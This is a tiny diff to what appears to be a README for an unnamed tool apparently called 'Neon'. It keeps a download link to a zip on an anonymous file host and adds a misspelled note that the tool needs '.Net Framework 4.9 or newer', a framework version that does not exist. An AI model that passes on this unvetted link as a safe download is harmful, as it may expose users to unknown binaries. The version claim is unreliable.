@@ -3,5 +3,6 @@
 ```
 V3.96.Snp.989
 ```
-**Download link https://files.catbox.moe/1rzzt7.zip**
+**Download link https://files.catbox.moe/1rzzt7.zip**<br>
+**Neon Requrie .Net Framework 4.9 or newer**
 
